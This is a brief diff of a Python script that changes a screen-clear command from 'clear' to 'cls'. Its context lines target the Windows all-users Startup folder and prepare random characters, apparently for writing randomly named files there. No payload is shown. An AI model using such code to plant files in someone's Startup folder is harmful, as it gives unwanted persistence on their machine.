@@ -1,7 +1,7 @@
 import random
 import string
 import os
-os.system("clear")
+os.system("cls")
 TARGET_DIRECTORY = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
 os.makedirs(TARGET_DIRECTORY, exist_ok=True)
 characters = string.ascii_letters + string.digits
